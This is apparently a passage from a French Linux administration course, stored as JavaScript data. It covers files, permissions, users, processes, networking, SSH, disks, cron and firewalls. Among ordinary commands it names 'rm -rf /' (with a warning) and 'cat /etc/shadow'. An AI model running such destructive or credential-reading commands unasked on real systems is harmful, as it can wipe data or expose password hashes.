 1   # Types de shell
 2   echo $SHELL            # Shell par défaut (/bin/bash)
 3   cat /etc/shells        # Lister les shells disponibles
 4   chsh -s /bin/zsh       # Changer de shell par défaut
 5
 6   # Variables
 7   NOM="Mohamed"           # Déclaration (PAS d'espaces autour de =)
 8   echo $NOM              # Afficher la variable
 9   echo "Bonjour $NOM"    # Interpolation (guillemets doubles)
10   echo 'Bonjour $NOM'   # Littéral (guillemets simples) → $NOM
11
12   # Variables d'environnement
13   export PATH=$PATH:/opt/bin    # Ajouter au PATH
14   env                          # Lister toutes les variables d'env
15   printenv HOME                # Afficher une variable spécifique
16
17   # Variables spéciales
18   $0    # Nom du script
19   $1    # Premier argument
20   $#    # Nombre d'arguments
21   $@    # Tous les arguments (séparés)
22   $*    # Tous les arguments (une chaîne)
23   $?    # Code retour de la dernière commande (0 = succès)
24   $$    # PID du shell courant
25   $!    # PID du dernier processus en arrière-plan

     ☞ Attention / Piège
      — Pas d'espaces autour du = dans les affectations : NOM="val" (pas NOM = "val")
      — Les guillemets doubles permettent l'interpolation, les simples non
      — $? doit être lu immédiatement après la commande testée`},{id:"2.1",c:2,t:"Navigation dans le système de fichiers",x:`❖ Définition
     Linux utilise une arborescence unique partant de / (racine). Tout est organisé
     sous cette racine, y compris les périphériques montés.

     ➔ Résumé rapide Arborescence Linux (FHS)

      Répertoire     Contenu

      /              Racine du système de fichiers
      /home          Répertoires personnels des utilisateurs
      /root          Répertoire personnel de root
      /etc           Fichiers de configuration système
      /var           Données variables (logs, mail, spool)
      /tmp           Fichiers temporaires (effacés au redémarrage)
      /bin           Commandes essentielles (ls, cp, mv)
      /sbin          Commandes système (fdisk, iptables)
      /usr           Programmes et bibliothèques utilisateur
      /opt           Logiciels tiers optionnels
      /dev           Fichiers de périphériques
      /proc          Pseudo-FS : infos processus et noyau
      /sys           Pseudo-FS : infos matériel
      /mnt, /media   Points de montage

     ➣ Syntaxe / Code Navigation

 1   pwd                    # Afficher le répertoire courant
 2   cd /etc                # Aller dans /etc (chemin absolu)
 3   cd ..                  # Remonter d'un niveau
 4   cd ~                   # Aller dans le home (~  = /home/user)
 5   cd -                   # Retourner au répertoire précédent
 6   cd ../..               # Remonter de 2 niveaux
 7
 8   ls                     # Lister les fichiers
 9   ls -l                  # Format long (permissions, taille, date)
10   ls -la                 # Inclure les fichiers cachés (commençant par .)
11   ls -lh                 # Tailles lisibles (Ko, Mo, Go)
12   ls -lR                 # Récursif
13   ls -lt                 # Trier par date de modification
14   ls -lS                 # Trier par taille
15
16   tree                   # Afficher l'arborescence
17   tree -L 2              # Limiter la profondeur à 2 niveaux`},{id:"2.2",c:2,t:"Manipulation de fichiers et répertoires",x:`➣ Syntaxe / Code Créer, copier, déplacer, supprimer

 1   # Créer
 2   touch fichier.txt           # Créer un fichier vide
 3   mkdir dossier               # Créer un répertoire
 4   mkdir -p a/b/c              # Créer une arborescence complète
 5
 6   # Copier
 7   cp source.txt dest.txt      # Copier un fichier
 8   cp -r dossier/ copie/       # Copier un répertoire (récursif)
 9   cp -i fichier.txt dest/     # Demander confirmation si écrasement
10   cp -p fichier.txt dest/     # Préserver les attributs (dates, droits)
11
12   # Déplacer / Renommer
13   mv ancien.txt nouveau.txt   # Renommer
14   mv fichier.txt /tmp/        # Déplacer
15   mv -i source dest           # Confirmation si écrasement
16
17   # Supprimer
18   rm fichier.txt              # Supprimer un fichier
19   rm -r dossier/              # Supprimer un répertoire récursivement
20   rm -rf dossier/             # Forcer sans confirmation (DANGEREUX !)
21   rmdir dossier_vide/         # Supprimer un dossier vide uniquement
22
23   # Liens
24   ln fichier.txt lien_dur         # Lien dur (même inode)
25   ln -s fichier.txt lien_symb     # Lien symbolique (raccourci)
26   readlink -f lien_symb           # Résoudre un lien symbolique

     ☞ Attention / Piège
      — rm -rf / peut détruire tout le système ! Toujours vérifier avant d'exécuter
      — Un lien dur ne peut pas traverser les systèmes de fichiers
      — Un lien symbolique peut pointer vers un fichier inexistant (lien cassé)`},{id:"2.3",c:2,t:"Visualisation et édition de fichiers",x:`➣ Syntaxe / Code Afficher et éditer le contenu

 1   cat fichier.txt              # Afficher tout le contenu
 2   cat -n fichier.txt           # Avec numéros de ligne
 3   tac fichier.txt              # Afficher à l'envers
 4
 5   head fichier.txt             # 10 premières lignes
 6   head -n 20 fichier.txt       # 20 premières lignes
 7   tail fichier.txt             # 10 dernières lignes
 8   tail -n 20 fichier.txt       # 20 dernières lignes
 9   tail -f /var/log/syslog      # Suivre en temps réel (logs)
10
11   less fichier.txt             # Pagination interactive
12   #   Espace = page suivante, b = page précédente
13   #   /mot = chercher, q = quitter
14
15   more fichier.txt             # Pagination simple
16
17   wc fichier.txt               # Compter lignes, mots, octets
18   wc -l fichier.txt            # Nombre de lignes seulement
19   wc -w fichier.txt            # Nombre de mots
20   wc -c fichier.txt            # Nombre d'octets
21
22   # Éditeurs en terminal
23   nano fichier.txt             # Éditeur simple (Ctrl+O sauver, Ctrl+X quitter)
24   vim fichier.txt              # Éditeur avancé (i=insert, Esc, :wq=sauver+quitter)
25   vi fichier.txt               # Version classique de vim

     ➔ Résumé rapide Commandes essentielles Vim

      Mode         Touche       Action

      Normal       i            Passer en mode insertion
      Normal       dd           Supprimer une ligne
      Normal       yy           Copier une ligne
      Normal       p            Coller
      Normal       u            Annuler
      Normal       /mot         Rechercher
      Normal       :w           Sauvegarder
      Normal       :q           Quitter
      Normal       :wq          Sauvegarder et quitter
      Normal       :q!          Quitter sans sauvegarder
      Insertion    Esc          Revenir en mode normal`},{id:"3.1",c:3,t:"Permissions et propriétés",x:`❖ Définition
     Chaque fichier/répertoire a 3 types de permissions pour 3 catégories :
      — Permissions : lecture (r=4), écriture (w=2), exécution (x=1)
      — Catégories : propriétaire (u), groupe (g), autres (o)
      — Format : rwxrwxrwx = user|group|others

     ➣ Syntaxe / Code Gestion des permissions

 1   ls -l fichier.txt
 2   # -rw-r--r-- 1 user group 1234 Jan 15 10:00 fichier.txt
 3   # │└──┴──┴──┘ │ │    │      │
 4   # │ u  g  o   │ │    │      └─ taille
 5   # └─ type     │ │    └─ groupe
 6   #   (- fichier, d dossier, l lien)
 7   #             │ └─ propriétaire
 8   #             └─ nombre de liens
 9
10   # chmod : changer les permissions
11   chmod 755 script.sh          # rwxr-xr-x (notation octale)
12   chmod 644 fichier.txt        # rw-r--r--
13   chmod u+x script.sh          # Ajouter exécution pour le propriétaire
14   chmod g-w fichier.txt        # Retirer écriture pour le groupe
15   chmod o=r fichier.txt        # Mettre lecture seule pour les autres
16   chmod a+r fichier.txt        # Lecture pour tous (a = all)
17   chmod -R 755 dossier/        # Récursif
18
19   # chown : changer le propriétaire
20   chown user fichier.txt             # Changer le propriétaire
21   chown user:group fichier.txt       # Changer propriétaire et groupe
22   chown -R user:group dossier/       # Récursif
23
24   # chgrp : changer le groupe
25   chgrp group fichier.txt

     ➔ Résumé rapide Permissions octales courantes

      Octal    Symbole     Usage typique

      777      rwxrwxrwx   Accès total (dangereux !)
      755      rwxr-xr-x   Scripts exécutables, dossiers
      644      rw-r--r--   Fichiers normaux
      600      rw-------   Fichiers privés (clés SSH)
      700      rwx------   Dossiers privés
      444      r--r--r--   Lecture seule pour tous

     ★ Astuce Concours
     Permissions spéciales : SUID (4), SGID (2), Sticky Bit (1)
      — SUID (chmod 4755) : exécuter avec les droits du propriétaire
      — SGID (chmod 2755) : exécuter avec les droits du groupe
      — Sticky Bit (chmod 1755) : seul le propriétaire peut supprimer ses fichiers (ex: /tmp)`},{id:"3.2",c:3,t:"Gestion des utilisateurs et groupes",x:`➣ Syntaxe / Code Administration des utilisateurs

 1   # Créer un utilisateur
 2   useradd -m -s /bin/bash user1       # -m = créer le home, -s = shell
 3   adduser user2                        # Version interactive (Debian)
 4   passwd user1                         # Définir/changer le mot de passe
 5
 6   # Modifier un utilisateur
 7   usermod -aG sudo user1               # Ajouter au groupe sudo
 8   usermod -l newname oldname           # Renommer
 9   usermod -d /new/home -m user1        # Changer le home
10   usermod -s /bin/zsh user1            # Changer le shell
11
12   # Supprimer un utilisateur
13   userdel user1                        # Supprimer (garder le home)
14   userdel -r user1                     # Supprimer avec le home
15
16   # Groupes
17   groupadd devs                        # Créer un groupe
18   groupdel devs                        # Supprimer un groupe
19   groups user1                         # Lister les groupes d'un user
20   id user1                             # UID, GID, groupes
21
22   # Fichiers importants
23   cat /etc/passwd                      # Liste des utilisateurs
24   # format: user:x:UID:GID:commentaire:home:shell
25   cat /etc/shadow                      # Mots de passe hashés (root)
26   cat /etc/group                       # Liste des groupes
27
28   # Élévation de privilèges
29   su - root                            # Basculer vers root
30   sudo commande                        # Exécuter en tant que root
31   sudo -u user1 commande              # Exécuter en tant que user1
32   visudo                               # Éditer /etc/sudoers (sécurisé)

     ☞ Attention / Piège
      — Ne jamais se connecter directement en root, utiliser sudo
      — Le fichier /etc/shadow ne doit être lisible que par root (600)
      — usermod -G (sans -a) REMPLACE tous les groupes secondaires !`},{id:"4.1",c:4,t:"Gestion des processus",x:`❖ Définition
     Un processus est un programme en cours d'exécution. Chaque processus a un PID unique,
     un PPID (parent), un UID (propriétaire), et un état (running, sleeping, zombie...).

     ➣ Syntaxe / Code Commandes de gestion des processus

 1   # Lister les processus
 2   ps                       # Processus du terminal courant
 3   ps aux                   # Tous les processus (format BSD)
 4   ps -ef                   # Tous les processus (format System V)
 5   ps aux | grep nginx      # Chercher un processus spécifique
 6
 7   top                      # Moniteur en temps réel
 8   htop                     # Moniteur amélioré (interactif)
 9
10   # Signaux
11   kill PID                 # Envoyer SIGTERM (terminaison propre)
12   kill -9 PID              # Envoyer SIGKILL (tuer de force)
13   kill -HUP PID            # Recharger la configuration
14   killall nginx            # Tuer par nom
15   pkill -f "python app"    # Tuer par pattern
16
17   # Arrière-plan et avant-plan
18   commande &               # Lancer en arrière-plan
19   jobs                     # Lister les jobs du shell
20   fg %1                    # Remettre le job 1 en avant-plan
21   bg %1                    # Continuer le job 1 en arrière-plan
22   Ctrl+Z                   # Suspendre le processus en cours
23   Ctrl+C                   # Interrompre le processus en cours
24
25   # nohup : continuer après déconnexion
26   nohup commande &         # Le processus survit à la fermeture du terminal
27   disown %1                # Détacher un job du shell
28
29   # Priorité (nice)
30   nice -n 10 commande      # Lancer avec priorité basse (10)
31   renice -n -5 PID         # Changer la priorité d'un processus
32   # -20 = plus haute priorité, 19 = plus basse

     ➔ Résumé rapide Signaux importants

      Signal      Numéro    Action

      SIGHUP      1         Recharger configuration
      SIGINT      2         Interruption (Ctrl+C)
      SIGKILL     9         Tuer immédiatement (non interceptable)
      SIGTERM     15        Terminaison propre (par défaut)
      SIGSTOP     19        Suspendre (non interceptable)
      SIGCONT     18        Reprendre après suspension`},{id:"4.2",c:4,t:"Services et systemd",x:`❖ Définition
     systemd est le système d'init par défaut de la plupart des distributions Linux modernes.
     Il gère le démarrage du système, les services (daemons), les logs, et plus encore.

     ➣ Syntaxe / Code Gestion des services avec systemctl

 1   # Gérer les services
 2   systemctl start nginx          # Démarrer un service
 3   systemctl stop nginx           # Arrêter un service
 4   systemctl restart nginx        # Redémarrer
 5   systemctl reload nginx         # Recharger la configuration
 6   systemctl status nginx         # Voir l'état du service
 7
 8   # Activation au démarrage
 9   systemctl enable nginx         # Activer au boot
10   systemctl disable nginx        # Désactiver au boot
11   systemctl is-enabled nginx     # Vérifier si activé
12   systemctl is-active nginx      # Vérifier si en cours
13
14   # Lister les services
15   systemctl list-units --type=service          # Services actifs
16   systemctl list-units --type=service --all    # Tous les services
17   systemctl list-unit-files --type=service     # Fichiers d'unité
18
19   # Journaux (logs)
20   journalctl                     # Tous les logs
21   journalctl -u nginx            # Logs d'un service spécifique
22   journalctl -f                  # Suivre en temps réel
23   journalctl --since today       # Logs du jour
24   journalctl -p err              # Seulement les erreurs
25   journalctl -b                  # Logs depuis le dernier boot
26
27   # Système
28   systemctl reboot               # Redémarrer le système
29   systemctl poweroff             # Éteindre
30   systemctl suspend              # Mettre en veille`},{id:"5.1",c:5,t:"Recherche de fichiers et texte",x:`➣ Syntaxe / Code find, grep, locate

 1   # find : recherche par critères dans le système de fichiers
 2   find /home -name "*.txt"              # Par nom
 3   find /home -iname "*.TXT"             # Insensible à la casse
 4   find / -type f -size +100M            # Fichiers > 100 Mo
 5   find / -type d -name "log"            # Répertoires nommés log
 6   find . -mtime -7                      # Modifiés dans les 7 derniers jours
 7   find . -user root                     # Appartenant à root
 8   find . -perm 755                      # Avec permissions 755
 9   find . -name "*.tmp" -delete          # Trouver ET supprimer
10   find . -name "*.sh" -exec chmod +x {} \\;   # Exécuter une commande
11
12   # grep : recherche dans le contenu des fichiers
13   grep "erreur" fichier.txt             # Chercher un mot
14   grep -i "erreur" fichier.txt          # Insensible à la casse
15   grep -r "TODO" /home/projet/          # Recherche récursive
16   grep -n "erreur" fichier.txt          # Afficher les numéros de ligne
17   grep -c "erreur" fichier.txt          # Compter les occurrences
18   grep -v "commentaire" fichier.txt     # Lignes NE contenant PAS le mot
19   grep -E "err(eur|or)" fichier.txt     # Expression régulière étendue
20   grep -l "motif" *.txt                 # Lister les fichiers contenant
21
22   # Combinaisons puissantes
23   grep -rn "function" --include="*.py" .    # Chercher dans les .py
24   find . -name "*.log" | xargs grep "ERROR"  # find + grep
25
26   # locate : recherche rapide par base de données
27   locate fichier.txt           # Recherche rapide (utilise une BDD)
28   updatedb                     # Mettre à jour la BDD de locate
29
30   # which / whereis : localiser des commandes
31   which python3                # Chemin de l'exécutable
32   whereis python3              # Exécutable + man + sources`},{id:"5.2",c:5,t:"Redirections et pipes",x:`❖ Définition
     Les redirections et pipes sont au cœur de la philosophie Unix :
     connecter des programmes simples pour créer des flux de traitement complexes.

     ➣ Syntaxe / Code Redirections et pipes

 1   # Redirections de sortie
 2   commande > fichier.txt       # Écraser le fichier
 3   commande >> fichier.txt      # Ajouter à la fin
 4   commande 2> erreurs.txt      # Rediriger stderr
 5   commande > out.txt 2>&1      # stdout + stderr dans un fichier
 6   commande &> tout.txt         # Idem (raccourci Bash)
 7
 8   # Redirection d'entrée
 9   commande < fichier.txt       # Lire depuis un fichier
10   commande << EOF              # Here document
11   ligne 1
12   ligne 2
13   EOF
14
15   # Pipe : connecter la sortie d'une commande à l'entrée d'une autre
16   ls -la | grep ".txt"                 # Filtrer la sortie de ls
17   cat access.log | sort | uniq -c | sort -rn | head   # Top accès
18   ps aux | awk '{print $1, $11}' | sort | uniq         # Users + cmds
19
20   # tee : écrire dans un fichier ET afficher
21   commande | tee fichier.txt           # Affiche + sauvegarde
22   commande | tee -a fichier.txt        # Affiche + ajoute
23
24   # xargs : convertir stdin en arguments
25   find . -name "*.txt" | xargs wc -l              # Compter les lignes
26   echo "f1 f2 f3" | xargs -n 1 touch              # Créer 3 fichiers
27   find . -name "*.bak" | xargs -I {} mv {} /tmp/   # Déplacer

     ★ Astuce Concours
     La commande pipeline la plus utile pour les concours :
      cat fichier | sort | uniq -c | sort -rn | head -n 10
     → Lit le fichier, trie, compte les doublons, trie par fréquence, top 10`},{id:"5.3",c:5,t:"Expressions régulières (regex)",x:`❖ Définition
     Les expressions régulières sont des motifs de recherche de texte utilisés par
     grep, sed, awk et de nombreux outils Unix.

     ➔ Résumé rapide Syntaxe des regex

      Symbole    Signification                    Exemple

      .          N'importe quel caractère         a.c → abc, a1c
      *          0 ou plus du précédent           ab* → a, ab, abb
      +          1 ou plus du précédent            ab+ → ab, abb (pas a)
      ?          0 ou 1 du précédent              ab? → a, ab
      ^          Début de ligne                   ^Hello
      $          Fin de ligne                     world$
      [ ]        Classe de caractères             [aeiou], [0-9]
      [^ ]       Négation de classe               [^0-9] = pas un chiffre
      \\d         Chiffre (équiv. [0-9])           \\d+ = un ou plusieurs chiffres
      \\w         Mot (lettre, chiffre, _)          \\w+
      \\s         Espace blanc                     \\s+
      |          Ou (alternation)                 cat|dog
      ( )        Groupement                       (ab)+
      {n}        Exactement n fois                a{3} → aaa
      {n,m}      Entre n et m fois                a{2,4}

     ➣ Syntaxe / Code Exemples pratiques

 1   # grep avec regex
 2   grep '^root' /etc/passwd              # Lignes commençant par root
 3   grep -E '^[A-Z]' fichier.txt          # Lignes commençant par majuscule
 4   grep -E '[0-9]{3}\\.[0-9]{3}' log.txt  # Motif type IP partiel
 5   grep -E '^$' fichier.txt              # Lignes vides
 6   grep -Ev '^(#|$)' config.conf         # Ignorer commentaires et vides
 7
 8   # sed : éditeur de flux
 9   sed 's/ancien/nouveau/' fichier.txt         # Remplacer (1ère occurrence)
10   sed 's/ancien/nouveau/g' fichier.txt        # Remplacer toutes
11   sed -i 's/ancien/nouveau/g' fichier.txt     # Modifier en place
12   sed '/^#/d' config.conf                     # Supprimer les commentaires
13   sed -n '5,10p' fichier.txt                  # Afficher lignes 5 à 10
14
15   # awk : traitement de texte avancé
16   awk '{print $1}' fichier.txt                # 1er champ
17   awk -F: '{print $1, $3}' /etc/passwd        # Séparateur : (user, UID)
18   awk '$3 > 1000' /etc/passwd                 # Filtrer par condition
19   awk '{sum += $1} END {print sum}' data.txt  # Somme de la 1ère colonne`},{id:"6.1",c:6,t:"Réseau : commandes essentielles",x:`➣ Syntaxe / Code Configuration et diagnostic réseau

 1   # Interfaces réseau
 2   ip addr                      # Afficher les interfaces (remplace ifconfig)
 3   ip addr show eth0            # Interface spécifique
 4   ip link set eth0 up          # Activer une interface
 5   ip link set eth0 down        # Désactiver
 6   ifconfig                     # Ancien outil (deprecated)
 7
 8   # Configuration IP
 9   ip addr add 192.168.1.100/24 dev eth0     # Ajouter une IP
10   ip route show                              # Table de routage
11   ip route add default via 192.168.1.1       # Route par défaut
12
13   # DNS
14   cat /etc/resolv.conf         # Serveurs DNS configurés
15   nslookup google.com          # Résolution DNS
16   dig google.com               # Résolution DNS détaillée
17   host google.com              # Résolution DNS simple
18
19   # Diagnostic
20   ping google.com              # Test de connectivité
21   ping -c 4 google.com         # 4 paquets seulement
22   traceroute google.com        # Tracer la route
23   mtr google.com               # ping + traceroute combinés
24
25   # Ports et connexions
26   netstat -tlnp                # Ports TCP en écoute
27   ss -tlnp                     # Idem (remplace netstat)
28   ss -s                        # Statistiques réseau
29   lsof -i :80                  # Qui utilise le port 80 ?
30
31   # Transfert de fichiers
32   scp fichier.txt user@host:/chemin/    # Copie via SSH
33   rsync -avz dossier/ user@host:/dest/  # Synchronisation
34   wget https://example.com/file.zip     # Télécharger
35   curl -O https://example.com/file.zip  # Télécharger
36   curl -X GET https://api.example.com   # Requête HTTP`},{id:"6.2",c:6,t:"SSH et accès distant",x:`❖ Définition
     SSH (Secure Shell) est un protocole de communication sécurisé pour l'accès
     distant à des machines Linux. Il utilise un chiffrement asymétrique.

     ➣ Syntaxe / Code Connexion et configuration SSH

 1   # Connexion
 2   ssh user@hostname                    # Connexion basique
 3   ssh -p 2222 user@hostname            # Port personnalisé
 4   ssh -i ~/.ssh/id_rsa user@hostname   # Clé spécifique
 5
 6   # Génération de clés
 7   ssh-keygen -t rsa -b 4096           # Générer paire RSA 4096 bits
 8   ssh-keygen -t ed25519               # Algorithme moderne (recommandé)
 9   # → Crée ~/.ssh/id_ed25519 (privée) + ~/.ssh/id_ed25519.pub (publique)
10
11   # Copier la clé publique sur un serveur
12   ssh-copy-id user@hostname            # Méthode automatique
13   # Ou manuellement :
14   cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
15
16   # Configuration SSH (~/.ssh/config)
17   # Host monserveur
18   #   HostName 192.168.1.100
19   #   User admin
20   #   Port 2222
21   #   IdentityFile ~/.ssh/id_ed25519
22   # → Ensuite : ssh monserveur
23
24   # Tunnel SSH (port forwarding)
25   ssh -L 8080:localhost:80 user@host     # Local → Remote
26   ssh -R 9090:localhost:3000 user@host   # Remote → Local
27   ssh -D 1080 user@host                  # Proxy SOCKS
28
29   # SCP et SFTP
30   scp -r dossier/ user@host:/dest/       # Copie récursive
31   sftp user@host                          # FTP sécurisé interactif

     ☞ Attention / Piège
      — Permissions de ~/.ssh : 700, authorized_keys : 600, clé privée : 600
      — Ne JAMAIS partager la clé privée
      — Désactiver l'authentification par mot de passe en prod : PasswordAuthentication no`},{id:"7.1",c:7,t:"Gestion des paquets",x:`➣ Syntaxe / Code Gestionnaires de paquets

 1   # === APT (Debian / Ubuntu) ===
 2   apt update                     # Mettre à jour la liste des paquets
 3   apt upgrade                    # Mettre à jour les paquets installés
 4   apt full-upgrade               # Mise à jour complète (peut supprimer)
 5   apt install nginx              # Installer un paquet
 6   apt remove nginx               # Désinstaller (garder config)
 7   apt purge nginx                # Désinstaller + supprimer config
 8   apt autoremove                 # Supprimer les dépendances inutiles
 9   apt search nginx               # Chercher un paquet
10   apt show nginx                 # Infos sur un paquet
11   apt list --installed           # Lister les paquets installés
12   dpkg -i paquet.deb             # Installer un .deb local
13   dpkg -l                        # Lister tous les paquets
14
15   # === YUM / DNF (Red Hat / Fedora / CentOS) ===
16   dnf install nginx              # Installer
17   dnf remove nginx               # Désinstaller
18   dnf update                     # Mettre à jour
19   dnf search nginx               # Chercher
20   dnf info nginx                 # Informations
21   rpm -ivh paquet.rpm            # Installer un .rpm local
22
23   # === Pacman (Arch Linux) ===
24   pacman -S nginx                # Installer
25   pacman -R nginx                # Désinstaller
26   pacman -Syu                    # Mettre à jour le système
27   pacman -Ss nginx               # Chercher
28
29   # === Snap / Flatpak ===
30   snap install firefox           # Installer via Snap
31   flatpak install firefox        # Installer via Flatpak`},{id:"7.2",c:7,t:"Gestion des disques et partitions",x:`➣ Syntaxe / Code Disques, partitions, montage

 1   # Informations disques
 2   lsblk                          # Lister les périphériques bloc
 3   fdisk -l                       # Lister les partitions
 4   df -h                          # Espace disque utilisé
 5   du -sh /home/*                 # Taille des dossiers
 6   du -sh --max-depth=1 /         # Taille de chaque dossier racine
 7
 8   # Partitionnement
 9   fdisk /dev/sdb                 # Partitionner un disque (MBR)
10   gdisk /dev/sdb                 # Partitionner un disque (GPT)
11   parted /dev/sdb                # Outil avancé
12
13   # Systèmes de fichiers
14   mkfs.ext4 /dev/sdb1            # Formater en ext4
15   mkfs.xfs /dev/sdb1             # Formater en XFS
16   mkfs.ntfs /dev/sdb1            # Formater en NTFS
17
18   # Montage
19   mount /dev/sdb1 /mnt/data      # Monter une partition
20   umount /mnt/data               # Démonter
21   mount -o remount,rw /          # Remonter en lecture-écriture
22
23   # Montage permanent (/etc/fstab)
24   # /dev/sdb1  /mnt/data  ext4  defaults  0  2
25   # UUID=xxxx  /mnt/data  ext4  defaults  0  2
26
27   # LVM (Logical Volume Manager)
28   pvcreate /dev/sdb1                     # Créer un Physical Volume
29   vgcreate vg_data /dev/sdb1             # Créer un Volume Group
30   lvcreate -L 10G -n lv_data vg_data     # Créer un Logical Volume
31   mkfs.ext4 /dev/vg_data/lv_data         # Formater
32   mount /dev/vg_data/lv_data /mnt/data   # Monter

     ➔ Résumé rapide Systèmes de fichiers Linux

      FS           Taille max     Usage

      ext4         1 EiB          Standard Linux, fiable
      XFS          8 EiB          Serveurs, grandes données
      Btrfs        16 EiB         Snapshots, compression
      FAT32        4 GiB/fichier  Clés USB, compatibilité
      NTFS         16 TiB         Interopérabilité Windows
      tmpfs        RAM            Fichiers temporaires en mémoire`},{id:"8.1",c:8,t:"Scripts Bash avancés",x:`➣ Syntaxe / Code Structures de contrôle Bash

 1   #!/bin/bash
 2   # Shebang : indique l'interpréteur
 3
 4   # Conditions
 5   if [ $age -gt 18 ]; then
 6       echo "Majeur"
 7   elif [ $age -eq 18 ]; then
 8       echo "Tout juste !"
 9   else
10       echo "Mineur"
11   fi
12
13   # Tests sur fichiers
14   if [ -f fichier.txt ]; then echo "Fichier existe"; fi
15   if [ -d dossier ]; then echo "Dossier existe"; fi
16   if [ -r fichier ]; then echo "Lisible"; fi
17   if [ -w fichier ]; then echo "Modifiable"; fi
18   if [ -x fichier ]; then echo "Exécutable"; fi
19   if [ -s fichier ]; then echo "Non vide"; fi
20
21   # Tests sur chaînes
22   if [ -z "$var" ]; then echo "Vide"; fi
23   if [ -n "$var" ]; then echo "Non vide"; fi
24   if [ "$a" = "$b" ]; then echo "Égaux"; fi
25
26   # Boucle for
27   for i in 1 2 3 4 5; do
28       echo "Numéro $i"
29   done
30
31   for fichier in *.txt; do
32       echo "Traitement de $fichier"
33   done
34
35   for ((i=0; i<10; i++)); do
36       echo $i
37   done
38
39   # Boucle while
40   compteur=0
41   while [ $compteur -lt 10 ]; do
42       echo $compteur
43       compteur=$((compteur + 1))
44   done
45
46   # Case (switch)
47   case $choix in
48       1) echo "Option 1" ;;
49       2|3) echo "Option 2 ou 3" ;;
50       *) echo "Choix invalide" ;;
51   esac
52
53   # Fonctions
54   saluer() {
55       local nom=$1     # Variable locale
56       echo "Bonjour $nom !"
57       return 0         # Code retour
58   }
59   saluer "Mohamed"

     ➔ Résumé rapide Opérateurs de test Bash

      Opérateur    Type       Signification

      -eq          Entier     Égal
      -ne          Entier     Différent
      -gt          Entier     Plus grand que
      -lt          Entier     Plus petit que
      -ge          Entier     Plus grand ou égal
      -le          Entier     Plus petit ou égal
      =            Chaîne     Égal
      !=           Chaîne     Différent
      -z           Chaîne     Vide
      -n           Chaîne     Non vide`},{id:"8.2",c:8,t:"Cron et automatisation",x:`❖ Définition
     Cron est le planificateur de tâches de Linux. Il permet d'exécuter des commandes
     ou scripts de manière récurrente selon un horaire défini.

     ➣ Syntaxe / Code Crontab

 1   # Éditer la crontab de l'utilisateur courant
 2   crontab -e
 3
 4   # Format : minute heure jour mois jour_semaine commande
 5   # ┌───────── minute (0 - 59)
 6   # │ ┌───────── heure (0 - 23)
 7   # │ │ ┌───────── jour du mois (1 - 31)
 8   # │ │ │ ┌───────── mois (1 - 12)
 9   # │ │ │ │ ┌───────── jour de la semaine (0 - 7, 0 et 7 = dimanche)
10   # │ │ │ │ │
11   # * * * * *  commande
12
13   # Exemples
14   0 * * * *    /script/sauvegarde.sh          # Toutes les heures
15   30 2 * * *   /script/nettoyage.sh           # Tous les jours à 2h30
16   0 0 * * 0    /script/weekly.sh              # Chaque dimanche minuit
17   */5 * * * *  /script/check.sh               # Toutes les 5 minutes
18   0 9-18 * * 1-5  /script/business.sh         # Heures de bureau, lun-ven
19
20   # Gestion
21   crontab -l               # Lister les tâches
22   crontab -r               # Supprimer toutes les tâches
23   crontab -u user -l       # Lister les tâches d'un utilisateur
24
25   # at : exécution unique à un moment donné
26   at 14:30                 # Programmer à 14h30
27   at now + 2 hours         # Dans 2 heures
28   atq                      # Lister les tâches at
29   atrm 5                   # Supprimer la tâche 5

     ★ Astuce Concours
     Les symboles cron :
      — * = chaque valeur possible
      — */n = toutes les n unités
      — n,m = les valeurs n et m
      — n-m = de n à m
     Exemple : */10 9-17 * * 1-5 = toutes les 10 min, de 9h à 17h, lundi à vendredi`},{id:"9.1",c:9,t:"Pare-feu et sécurité réseau",x:`➣ Syntaxe / Code iptables et ufw

 1   # === UFW (Uncomplicated Firewall) — Ubuntu/Debian ===
 2   ufw enable                         # Activer le pare-feu
 3   ufw disable                        # Désactiver
 4   ufw status verbose                 # État détaillé
 5   ufw allow 22                       # Autoriser SSH
 6   ufw allow 80/tcp                   # Autoriser HTTP
 7   ufw allow 443/tcp                  # Autoriser HTTPS
 8   ufw deny 3306                      # Bloquer MySQL
 9   ufw allow from 192.168.1.0/24      # Autoriser un sous-réseau
10   ufw delete allow 80                # Supprimer une règle
11
12   # === iptables (avancé) ===
13   iptables -L -v -n                  # Lister les règles
14   iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # Autoriser port 80
15   iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # Autoriser SSH
16   iptables -A INPUT -j DROP          # Bloquer tout le reste
17   iptables -D INPUT 3                # Supprimer la règle 3
18   iptables -F                        # Vider toutes les règles
19
20   # Sauvegarder les règles iptables
21   iptables-save > /etc/iptables.rules
22   iptables-restore < /etc/iptables.rules
23
24   # === firewalld (Red Hat / Fedora) ===
25   firewall-cmd --state               # État
26   firewall-cmd --list-all            # Lister les règles
27   firewall-cmd --add-service=http --permanent   # Autoriser HTTP
28   firewall-cmd --add-port=8080/tcp --permanent  # Autoriser port
29   firewall-cmd --reload              # Appliquer les changements

     ☞ Attention / Piège
      — Toujours autoriser SSH (port 22) AVANT d'activer le pare-feu !
      — Les règles iptables sont appliquées dans l'ordre, la première correspondance gagne
      — Ne pas oublier --permanent avec firewalld, sinon perdu au redémarrage`},{id:"9.2",c:9,t:"Archivage et compression",x:`➣ Syntaxe / Code tar, gzip, zip

 1   # tar : archivage (sans compression par défaut)
 2   tar cf archive.tar dossier/          # Créer une archive
 3   tar xf archive.tar                   # Extraire
 4   tar tf archive.tar                   # Lister le contenu
 5
 6   # tar + compression
 7   tar czf archive.tar.gz dossier/      # Créer + gzip
 8   tar xzf archive.tar.gz               # Extraire .tar.gz
 9   tar cjf archive.tar.bz2 dossier/     # Créer + bzip2
10   tar xjf archive.tar.bz2              # Extraire .tar.bz2
11   tar cJf archive.tar.xz dossier/      # Créer + xz
12
13   # Options utiles de tar
14   tar czf archive.tar.gz -C /chemin dossier/   # Depuis un répertoire
15   tar czf archive.tar.gz --exclude='*.log' .    # Exclure des fichiers
16   tar xzf archive.tar.gz -C /destination/       # Extraire ailleurs
17
18   # gzip / gunzip
19   gzip fichier.txt                     # Compresser → fichier.txt.gz
20   gunzip fichier.txt.gz                # Décompresser
21   gzip -k fichier.txt                  # Garder l'original
22   gzip -d fichier.txt.gz               # Décompresser (= gunzip)
23
24   # zip / unzip
25   zip archive.zip fichier1 fichier2    # Créer un zip
26   zip -r archive.zip dossier/          # Zip récursif
27   unzip archive.zip                    # Extraire
28   unzip -l archive.zip                 # Lister le contenu
